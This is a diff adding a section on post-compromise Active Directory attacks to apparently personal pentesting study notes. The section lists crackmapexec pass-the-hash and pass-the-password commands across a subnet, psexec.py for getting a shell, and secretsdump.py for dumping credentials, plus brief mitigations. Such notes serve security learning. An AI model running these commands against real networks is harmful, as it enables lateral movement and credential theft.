@@ -55,7 +55,18 @@
  - Upload filze.ip to BloodHound.
  - Queries, Theres perbuilt query tab.
 
-
+# Post Compromise Attacls
+### Pass the hash attack/Pass the password attack
+ - `crackmapexec smb <network>/24 -u username -d <domain_Name> -p <password>`
+ - Or if u have hash from hashdump, take last bit of dump "...:hash:::" `crackmapexec smb <network>/24 -u username -H <hash> --local`
+ - Use psexec.py to get shell access. `psexec.py <domain>/<user>:<password>@<ip>`
+ - `secretsdump.py <domain>/<user>:<password>@<ip>`
+ - Check if hash is same for Administrator and Username? 
+ - NTLM hashes can be passed, NTLMv2 can not be passed.
+ - If not on kali and other distro, snap has crackmapexec. `snap install crackmapexec`
+ - Mitigations `Limit account reuse`, `Strong passwords`, `PAM (Privilige Access Management)`
+ 
+ 
 # Background
  - Windows domain is a group of users and computers under the administration of a given business
  - Active Directory acts as a catalogue that holds the information of all of the "objects" that exist on your network.
